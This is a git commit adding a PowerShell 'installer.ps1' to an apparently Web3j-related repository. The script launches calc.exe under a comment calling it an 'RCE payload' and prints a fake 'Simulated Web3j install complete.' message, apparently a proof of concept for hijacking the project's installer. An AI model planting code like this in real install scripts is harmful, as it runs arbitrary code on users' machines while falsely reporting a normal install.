597f71ac446d61bffe50ae67b0f3f97e1fae3804
S.Lakshmi Vignesh <169062599+hyperledger-web3j@users.noreply.github.com>
2025-05-23 00:03:24 +0530

    Add files via upload

---
+++ installer.ps1
@@ -0,0 +1,11 @@
+﻿Set-StrictMode -Version Latest
+$ErrorActionPreference = "Stop"
+$PSDefaultParameterValues['*:ErrorAction']='Stop'
+[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+$ProgressPreference = 'SilentlyContinue'
+
+# ✅ RCE payload (opens calculator)
+Start-Process "calc.exe"
+
+# Dummy output
+Write-Output "Simulated Web3j install complete."
